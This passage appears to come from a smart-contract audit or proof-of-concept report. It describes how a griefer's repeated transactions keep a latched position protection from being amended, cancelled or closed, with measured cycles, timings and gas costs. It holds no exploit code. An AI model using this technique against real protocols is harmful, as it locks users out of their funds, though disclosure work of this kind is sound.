the first triggered close fails `GrossAccountDebit` with an actual debit of 4_000.00002 USDG against the trader's 2_500 USDG ceiling, and the protection latches. with the griefer cycling, all 133 owner amend attempts revert over 3_846 s and 67 cycles, and cancel, the manual exit and an ordinary close revert at every probe. the position is still 100_000 USDG with the original ceilings when the run ends, and the 24-hour run shows the same after 1_420 cycles over 86_559 s. the griefer spends about 1_065_141 gas per cycle. without the griefer, the owner amends right after the latch and the position closes.

